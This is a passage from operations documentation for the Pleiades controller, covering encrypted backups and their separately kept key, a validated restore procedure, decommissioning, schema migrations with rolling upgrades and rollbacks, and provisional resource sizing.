up with `pg_dump` the way you back up any other, and keep its key the way the next
section says.

### A backup and its key are kept apart

A backup is useless without the master encryption key: every credential, stored
device property, saved survey answer and mesh signing seed in it is sealed under
that key. The key alone restores nothing either. Setup's own words are that the two
together are everything this deployment stores.

**A backup does not contain the key**, on purpose. A backup gets copied to more
places than a key does, and a file holding both is a file anyone who finds it can
read everything in. Instead, a backup's name carries the first eight characters of
the key's fingerprint:

```text
backups/pleiades-20260918T141707Z-3f9ac21b.dump
```

`3f9ac21b` is the key it needs, the same fingerprint setup showed you and the
activity trail records, as `3f9a-c21b`. Keep the key somewhere the backups are not.
Losing the machine then loses neither, and finding a backup gives nobody the key.

### Taking a backup

```bash
make backup
```

It works with the stack running: PostgreSQL gives `pg_dump` one consistent snapshot
while the controller keeps working. A stopped stack's database is started for it.

- The file is written under a hidden temporary name at mode 0600, read back through
  `pg_restore --list`, and checked the way a restore checks one. Only then does it
  take its real name. A backup that stopped partway, or that no restore would
  accept, is deleted rather than left looking like a backup.
- It says what the backup holds ("1 credential, the stored properties of 3
  devices"), and whether every one of those values opens under the key in `.env`.
  A value that does not is backed up exactly as it is, and the message says so.
- It holds password hashes, session hashes, the activity trail and every job's
  history as they are. Store it the way you would store the database.
- It does not hold messages waiting on the broker, the controller's self-signed
  certificate, or the runbook directory.
- `BACKUP_DIR=<directory>` writes somewhere other than `./backups`.

On the test database, a backup took 123 ms where `pg_dump` alone took 90 ms. The
difference is the count of sealed values and the read-back, and it grows with the
number of sealed values, not with the size of the database.

### Restoring

```bash
make restore BACKUP=backups/pleiades-20260918T141707Z-3f9ac21b.dump
```

It stops the controller and the runner, since anything they wrote during the restore
would be lost. Then it takes these steps in order. Until the last one, the live
database is not touched, and any refusal leaves it exactly as it was:

1. **The file.** It must be a regular file (not a link) in PostgreSQL's custom
   format, and its table of contents may hold only the kinds of entry a backup of
   this schema holds: tables, their data, sequences, indexes and constraints. A
   function, a trigger, a view, or a table this version does not have is refused
   before anything is loaded.
2. **A scratch database.** The file is loaded into a new database by a new role
   that owns that database and nothing else. It is not a superuser, cannot create
   roles or databases, and cannot run programs or read files on the server. Every
   statement in the file runs as that role. Then every setting the file could have
   attached to the database or the role is cleared.
3. **The key.** Every sealed value is tried against the key in `.env`, and the
   previous key during a rotation. Each must open under one of them, *and* carry the
   version tag `.env` gives that key, because the controller finds a value's key by
   its tag. If not, it refuses, and names the keys the backup's own key registry
   lists.
4. **The schema.** The scratch database is brought up to this version's schema, as
   its role, and then compared with a fresh database this version's migrations
   build: every table, column, default, constraint, index and sequence, and the
   absence of any function, trigger, rule, policy, extension or setting. Anything
   different is refused, including a column default that calls a built-in function.
   A backup from a newer version is refused here: restore it with that version.
5. **What the backup could not know.** Jobs the backup caught running are marked
   failed, with the reason: what they did after the backup is not recorded, so check
   their devices before running them again. Otherwise they would be picked up and run
   a second time. Every session is ended, since some may have been signed out or
   removed since the backup; everyone signs in again. The activity trail records
   `controller-restore restored database pleiades from <file>`.
6. **The database being replaced is backed up first**, to
   `backups/pleiades-<time>-<key>-before-restore.dump`. Restoring that file the same
   way puts it back.
7. **The swap.** The two databases trade names in one transaction, and the replaced
   one is dropped.

Then `make restore` clears the broker, whose queued messages belong to the database
that was replaced, and brings the stack up with `make up`.

After a restore, a schedule with occurrences between the backup and now runs once,
for the most recent, and records the rest as skipped, as after any outage. A
schedule that ran after the backup was taken can therefore run again.

### Restoring onto a new machine

On a machine with no `.env`, the restore asks for the key the backup was taken under,
naming it by fingerprint, and reads it with echo off. It refuses a key whose
fingerprint is not the one in the backup's name. Once every check passes, it writes
the key to `.env`, with the version tag the backup's values carry. `make up` then
adds a new JWT secret and asks the outage question, as setup always does.

In a script, send the key on standard input:

```bash
echo "$KEY" | make restore BACKUP=backups/pleiades-20260918T141707Z-3f9ac21b.dump \
  RESTORE_FLAGS=--key-stdin SETUP_FLAGS=--non-interactive
```

A backup taken during a key rotation needs both keys. Write them to `.env` as
`MASTER_ENCRYPTION_KEY` and `MASTER_ENCRYPTION_KEY_PREVIOUS`, each with its version
tag, before restoring.

### When the key is lost

There is no procedure, because there is nothing a procedure could recover. The
sealed values in every backup taken under that key are unreadable by anyone, this
project included: credential secrets, stored device properties, saved survey
answers and mesh signing seeds.

What is not sealed survives: users and their password hashes, organizations, teams,
role bindings, inventories and devices (apart from their sealed properties),
templates, schedules, job history and the activity trail. Nothing keeps that part
for you yet. A restore refuses a backup whose sealed values the key cannot read,
because a controller started on it would fail each time it reached one. Setup
refuses to write a new key over a database holding values sealed under another key,
for the reason given in [What setup tells you about later](#what-setup-tells-you-about-later).
Keeping the unsealed part would mean deleting every sealed value first, which no
command does today.

### Stopping and removing

`make down` stops the stack and removes its containers and network. It keeps the
database, the broker's stored messages, the controller's certificate and `.env`, and
`make up` brings the same deployment back.

`make decom` removes the deployment for good: the containers, the network, every
volume, and `.env` with the key in it. It keeps `./backups`, the images and this
checkout. First it shows what it removes and what it keeps, including how many
backups there are, when the newest was taken, and which key it needs. It goes on
only when you type `decommission <fingerprint>`, so the moment you confirm deleting
the key is the moment you see which key your backups need. Without a terminal it
needs `make decom DECOM_FLAGS=--destroy-deployment`. The volumes are removed before
`.env`, so if removing them fails, the key that reads them is still there.

### Data retention and purge

Not built yet. Jobs, their results and the activity trail are kept until someone
deletes them, and nothing purges them on a schedule. The broker's retention is the
one exception, derived from the outage budget (see
[One number sets how long an outage may last](#one-number-sets-how-long-an-outage-may-last)).

## Upgrading and rolling back

Upgrading is starting a newer build against the same database. The new controller
brings the database's schema forward when it starts, one migration at a time.
Migrations only run forward: nothing ever runs one backwards.

### Ask the new build first

Before an upgrade, run the NEW build's plan against the live database:

```bash
controller migrate --plan          # or: --json, the same answer as data
```

It changes nothing. It says which migrations the new build would apply, whether any
of them is a *contract* (see below), and which controllers the database has seen
recently, with their versions. Its exit code is its answer, so a script can act on
it:

| Exit | Meaning |
|---|---|
| 0 | The database is new, or already current. Nothing to apply. |
| 3 | Starting this build upgrades a database that holds data. Take a backup first. |
| 4 | A newer build already migrated this database, and this build can still serve it. |
| 1 | This build must not use this database, or it could not be read. It says why. |

Compose does this for you: `make up` runs the new build's plan, and on exit 3 it
stops the controller and the runner, takes a backup, and only then starts the new
build. If that backup fails, nothing is upgraded and nothing is started.

### What each way of upgrading keeps

| How you run it | How you upgrade | Data and key | Sessions | Certificate | Downtime |
|---|---|---|---|---|---|
| One controller binary | Stop it, replace the file, start it | Kept | Kept | Kept | The restart plus the migration |
| Compose | Check out the new release, then `make up` | Kept, and backed up first | Kept | Kept | From the stop to the new controller being ready |
| Helm, one replica (the default) | `helm upgrade` with the same values file | Kept | Kept | Kept | Short: the chart replaces the pod (Recreate) |
| Helm, two or more replicas | `helm upgrade` with the same values file | Kept | Kept | Kept | None: the old pods serve while the new one migrates |

Sessions are rows in the database, so a browser stays signed in across an upgrade
as long as the outage is shorter than the 30 minute idle limit. API tokens stay valid
because `JWT_SECRET` does not change. The certificate a controller made for itself
lives on its volume, which an upgrade keeps.

Three things to know about Helm:

- Pass the same values file again rather than `--reuse-values`. A newer chart can add
  a setting, and `--reuse-values` leaves it unset.
- The chart takes no backups. Back up the database with `pg_dump` before an upgrade
  that `controller migrate --plan` says will change it.
- More than one replica needs a volume every replica can mount
  (`persistence.accessMode=ReadWriteMany`) or no volume at all
  (`persistence.enabled=false`, with `tls.mode=secret`). A stopping controller keeps
  serving for `controller.shutdownDrainSeconds` after it reports itself not ready, so
  the Service stops routing to it before it closes its port.

### Many controllers at once

Any number of controllers can start against one database at the same time, and every
one of them comes up. Each migration is applied once: the first controller to reach
it does the work, and the others wait for it and carry on. A controller that dies
part way releases the migration, and another one applies it.

Two limits come with that:

- Each controller keeps up to 16 database connections. PostgreSQL allows 100 by
  default, so raise `max_connections` before running more than about five replicas.
- A migration waits at most 10 seconds for a table another session holds. Then the
  controller exits, and its restart tries again. A long report query against a busy
  table can therefore delay an upgrade, but it cannot make every other query wait
  behind the migration.

### Old and new builds at the same time

During a rolling upgrade the old controllers keep serving while the new one migrates.
That is safe because of a rule every migration follows: it only *expands* the schema,
by adding tables, columns that may be empty or have a default, and indexes that are
not unique, so the build before it keeps working. A migration that removes or narrows
something, including a unique index over columns that already hold data, is a
*contract*, and is declared as one along with the oldest build that can still serve
the schema it leaves. Tests enforce both halves: every migration's real effect on the
schema is checked against its declaration, and an upgrade test runs the previous
build against the newly migrated database and makes it do its ordinary work.

Every migration records that oldest build. So:

- A controller from this release on, started against a database a newer build
  migrated, serves it if every newer migration left a schema it can still serve, and
  says so in its log. Otherwise it refuses to start and says which build it needs.
- A running controller rechecks every 15 seconds. If a newer build has contracted the
  schema past it, it stops being ready, stops, and exits with an error.

What no check can see: a column whose meaning changes while its shape does not, the
shape of messages on the broker, and a new value in a field stored as text. Those are
reviewed by hand.

### Rolling back

- **Within the window**, start the previous build again: `helm rollback`, the previous
  image, or the previous binary. The database stays as it is. Anything the newer
  build added is still there, unused.
- **Past the window**, when a contract lies between the two builds, the previous build
  refuses the database. Restore the backup taken before the upgrade, with the
  previous release: `make restore BACKUP=<the file make up named>` from its checkout.
  Everything done since that backup is lost, which is what rolling back past a
  contract means. That is why `make up` takes the backup, and why a Helm upgrade
  should be preceded by one.

## Observability and troubleshooting

Prometheus metrics are exposed at `/metrics`. Structured logging exists throughout
the control plane and the runner agent. A generated metrics reference, an alerting
guide, and a troubleshooting/diagnostics-collection guide do not exist yet.

## HA and leader failover

Distributed leader election is real and tested (`internal/election`), used for
control-plane components that must run as a single active instance. A full
operational guide to configuring and verifying HA in a real multi-node deployment
does not exist yet.

## Multi-tenancy

None today. RBAC has three roles (`viewer`, `operator`, `admin`) and a scope model,
but there is no tenant isolation concept above that.

## Sizing

**Still not written, and the reason has changed.** It used to be that there was no
deployable artifact to size at all, since the reference chart was unmodified
`helm create` output that deployed nginx. That is fixed: `helm/the-pleiades` is a
real chart. What is still missing is a measurement. No Pleiades deployment has been
run under sustained load, so any table of "N devices needs M runners" here would be
arithmetic invented to fill a section.

What the chart does ship is a starting point, and it is worth reading as exactly
that:

| Workload | CPU request | Memory request | Memory limit | Default replicas |
|---|---|---|---|---|
| controller | 100m | 256Mi | 1Gi | 1 |
| runner | 100m | 256Mi | 1Gi | 2 |
| PostgreSQL (in-chart) | 250m | 256Mi | 1Gi | 1 |
| NATS (in-chart) | 100m | 128Mi | 512Mi | 1 |

Those numbers are sized to start on a laptop-scale cluster, not measured under load.
Two things about the shape of them are deliberate and do carry over:

- **Requests are set and CPU limits are not.** A CPU limit is enforced by CFS quota,
  so a process that reaches it is throttled for the remainder of the period, which
  arrives as latency on a request that did nothing wrong. Memory has no equivalent
  graceful degradation, so memory carries a limit and CPU does not. If your cluster
  applies a `LimitRange` that adds CPU limits anyway, that is worth knowing before
  you conclude Pleiades is slow.
- **The runner scales with the number of concurrent device conversations, not with
  request rate.** Runners pull from one durable NATS consumer group, so adding
  replicas adds parallelism and never duplicates work. There is deliberately no
  autoscaler on them: their load arrives as queue depth, and a CPU-driven autoscaler
  would scale *down* a fleet that is blocked waiting on slow devices, which is
  exactly backwards. Scale them by hand, or on a queue-depth metric if you already
  run an external metrics adapter.

One measured number is worth planning around in the meantime: a task that calls a
Collection method pays roughly 10 ms of process-isolation overhead on top of whatever
the device work itself costs, because each such task runs in its own child process
(see [Start here](01-start-here.md)). Tasks using `ssh_exec` do not pay it. Beyond
that, writing a sizing guide would still be a guess dressed up as guidance.
